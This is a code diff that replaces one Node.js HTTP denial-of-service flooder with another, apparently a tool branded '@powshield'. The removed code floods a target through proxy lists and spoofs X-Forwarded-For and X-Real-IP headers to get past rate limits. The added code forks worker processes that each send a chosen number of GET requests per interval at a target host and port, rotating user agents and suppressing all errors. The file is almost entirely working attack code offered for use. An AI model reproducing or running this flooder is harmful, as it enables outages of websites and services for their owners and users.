@@ -1,142 +1,98 @@
-const request = require('request');
-const fs = require('fs');
-const UserAgent = require('user-agents');
-const URL = require('url');
-const cluster = require('cluster');
-const os = require('os');
+const http = require('http');
+const url = require('url');
 const net = require('net');
+const fs = require('fs');
+const cluster = require('cluster');
 
-var args = {
-  url: process.argv[2],                     // url
-  host: URL.parse(process.argv[2]).host,    // host
-  proxy: process.argv[3],                   // proxy file
-  mode: process.argv[4],                    // mode (http/socket)
-  time: parseInt(process.argv[5]),          // boot time
-  rps: 1000/parseInt(process.argv[6]),      // rps (bypass ratelimit)
-  cache: process.argv[7],                   // bypass cache with random get True/False
-  threads: parseInt(process.argv[8]),       // number of threads for cluster
-};
-
-const usage = "usage: <url> <proxy_file> <mode (http/socket)> <time> <rps> <cache bypass (True/False)> <threads>";
-if (process.argv.length < 9) return console.log(usage);
-
-function randomByte() {
-  return Math.round(Math.random() * 256);
+if (process.argv.length <= 5) {
+  console.log('node pow.js <url> <port> <connect 1 - 9999> <threads> <time> [@powshield]');
+  process.exit(-1);
 }
 
-function randomIp() {
-  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
+const target = process.argv[2];
+const parsed = url.parse(target);
+const host = parsed.host;
+const rps = process.argv[4];
+const threads = process.argv[5];
+const time = process.argv[6];
 
-  return isPrivate(ip) ? ip : randomIp();
+let customPort;
+if (process.argv.length > 3) {
+  customPort = process.argv[3];
+} else {
+  customPort = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
 }
 
-function isPrivate(ip) {
-  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
+
+process.on('uncaughtException', function (error) {});
+process.on('unhandledRejection', function (error) {});
+
+let userAgents = [];
+try {
+  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
+} catch (error) {
+  console.error('you dont have ua go download!! ua.txt' + error);
+  process.exit(-1);
 }
 
-var ips_spoofed = [];
-for (let i = 0; i < 200; i++) {
-  ips_spoofed.push(randomIp());
-}
+const nullHexs = [
+  "\x00",
+  "\xFF",
+  "\xC2",
+  "\xA0"
+];
 
-function get_fake_ips() {
-  let xforwarded = "";
-  for (let i = 0; i < (6 ? Math.round(Math.random() * (6 - 4)) + 6 : Math.round(Math.random() * 4)); i++) {
-    xforwarded += ips_spoofed[Math.floor(Math.random() * ips_spoofed.length)] + ", ";
+if (cluster.isMaster) {
+  for (let i = 0; i < threads; i++) {
+    cluster.fork();
   }
-  return xforwarded.slice(0, -2);
+  
+  console.log('Attack Send!! [@powshield]');
+  setTimeout(() => {
+    process.exit(1);
+  }, time * 1000);
+} else {
+  startFlood();
 }
 
-function getUA() {
-  return new UserAgent().toString();
-}
+function startFlood() {
+  const interval = setInterval(() => {
+    for (let i = 0; i < rps; i++) {
+      const options = {
+        host: host,
+        port: customPort,
+        path: parsed.path,
+        method: 'GET',
+        headers: {
+          'Host': host,
+          'DNT': '1',
+          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Accept-Encoding': 'gzip, deflate, br',
+          'Pragma': 'no-cache',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'Connection': 'keep-alive'
+        },
+      };
 
-function socket_generate_payload(args, ua) {
-  let headers = "";
-  headers += 'GET ' + args.url + ' HTTP/1.1' + '\r\n';
-  headers += 'Host: ' + args.host + '\r\n';
-  headers += 'Connection: keep-alive' + '\r\n';
-  headers += 'Dnt: 1' + '\r\n';
-  headers += 'User-Agent: ' + ua + '\r\n';
-  headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' + '\r\n';
-  headers += 'Accept-Language: en-US,en;q=0.9' + '\r\n';
-  headers += 'Accept-Encoding: gzip, deflate, br' + '\r\n';
-  headers += 'Pragma: no-cache' + '\r\n';
-  headers += 'Cache-Control: max-age=0' + '\r\n';
-  headers += 'Upgrade-Insecure-Requests: 1' + '\r\n';
-  headers += 'X-Real-IP: ' + get_fake_ips() + '\r\n';
-  headers += 'X-Forwarded-For: ' + get_fake_ips() + '\r\n';
-  headers += '\r\n';
-
-  return headers;
-}
-
-function socket_flood(args, proxy, ua) {
-  setInterval(() => {
-    let payload = socket_generate_payload(args, ua);
-    try {
-      let socket = net.connect(proxy.split(':')[1], proxy.split(':')[0]);
-
-      socket.setKeepAlive(true, 50000);
-      socket.setTimeout(50000);
-      socket.once('error', err => {});
-      socket.once('disconnect', () => {});
-      socket.once('data', () => {});
-
-      for (let j = 0; j < 40; j++) {
-        socket.write(payload);
-      }
-
-      socket.on('data', () => {
-        setTimeout(() => {
-          socket.destroy();
-        }, 5000);
-      });
-    } catch (e) {}
+      const request = http.request(options);
+      request.setHeader('Host', host);
+      request.setHeader('DNT', '1');
+      request.setHeader('User-Agent', userAgents[Math.floor(Math.random() * userAgents.length)]);
+      request.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3');
+      request.setHeader('Accept-Language', 'en-US,en;q=0.9');
+      request.setHeader('Accept-Encoding', 'gzip, deflate, br');
+      request.setHeader('Pragma', 'no-cache');
+      request.setHeader('Cache-Control', 'max-age=0');
+      request.setHeader('Upgrade-Insecure-Requests', '1');
+      request.setHeader('Connection', 'keep-alive');
+      request.end();
+    }
   });
+
+  setTimeout(() => clearInterval(interval), time * 1000);
 }
-
-function start(args) {
-  if (cluster.isMaster) {
-    const numCPUs = Math.min(os.cpus().length, args.threads);
-    console.log(`Starting ${args.mode} flood on ${args.url} for ${args.time} second(s) with ${numCPUs} worker(s)`);
-
-    for (let i = 0; i < numCPUs; i++) {
-      cluster.fork();
-    }
-
-    setTimeout(() => {
-      for (const id in cluster.workers) {
-        cluster.workers[id].kill();
-      }
-      process.exit(4);
-    }, args.time * 1000);
-  } else {
-    proxies = fs.readFileSync(args.proxy, 'utf-8').toString().replace(/\r/g, '').split('\n');
-    let ua = getUA();
-    for (let i = 0; i < proxies.length; i++) {
-      let proxy = proxies[i];
-      start_flood(args, proxy, ua);
-    }
-  }
-}
-
-function start_flood(args, proxy, ua) {
-  if (args.mode === "socket") {
-    socket_flood(args, proxy, ua);
-  }
-}
-
-setTimeout(() => {
-    process.exit(4);
-}, (arguments.time * 1000));
-
-process.on('uncaughtException', function(e) {
-    console.warn(e);
-}).on('unhandledRejection', function(e) {
-    console.warn(e);
-}).on('warning', e => {
-    console.warn(e);
-}).setMaxListeners(0);
-
-start(args);
